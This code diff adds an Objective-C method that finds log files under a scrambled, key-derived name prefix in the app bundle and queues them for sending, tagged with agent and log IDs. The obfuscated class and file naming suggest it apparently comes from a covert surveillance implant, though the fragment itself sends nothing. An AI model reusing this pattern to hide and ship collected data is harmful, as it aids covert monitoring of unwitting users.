@@ -349,6 +349,72 @@ static __m_MLogManager *sharedLogManager = nil;
 #pragma mark Logging facilities
 #pragma mark -
 
+- (void)updateLogQueue
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSString *encLog;
+  NSString *logName;
+  NSArray *logs;
+  NSRange range;
+    
+  logName = [[NSString alloc] initWithFormat:@"%@", @"LOGF_"];
+  
+  encLog = [NSString stringWithFormat:@"%@", [mEncryption scrambleForward: logName
+                                                                     seed: gLogAesKey[0]]];
+
+  logs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:[[NSBundle mainBundle] bundlePath]
+                                                             error: nil];
+  
+  range.location = 0;
+  range.length = [encLog lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
+   
+  // Bogus agent ID used in removeSendLog:withLogID
+  NSNumber *agent   = [[NSNumber alloc] initWithUnsignedInt: 0x00FFFFFF];
+  
+  for (int i=0; i < [logs count]; i++)
+  {
+    NSString *fileName = (NSString*) [logs objectAtIndex:i];
+    
+    // Bogus logID used in removeSendLog:withLogID
+    NSNumber *_logID  = [[NSNumber alloc] initWithUnsignedInt: i];
+    
+    if ([fileName length] > range.length &&
+        [[fileName substringWithRange:range] compare: encLog] == NSOrderedSame)
+    {
+      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
+      
+      NSArray *keys = [NSArray arrayWithObjects:@"agentID",
+                                                @"logID",
+                                                @"logName",
+                                                @"handle",
+                                                @"header",
+                                                nil];
+
+      NSArray *objects = [NSArray arrayWithObjects:agent,
+                                                   _logID,
+                                                   fileName,
+                                                   @"NONE",
+                                                   @"NO",
+                                                   nil];
+    
+      NSMutableDictionary *agentLog = [[NSMutableDictionary alloc] init];
+      
+      NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
+                                                             forKeys: keys];
+      [agentLog addEntriesFromDictionary: dictionary];
+      
+      [mSendQueue addObject: agentLog];
+      
+      [agentLog release];
+      
+      [inner release];
+    }
+  }
+  
+  [pool release];
+}
+
 - (BOOL)createLog: (u_int)agentID
       agentHeader: (NSData *)anAgentHeader
         withLogID: (u_int)logID
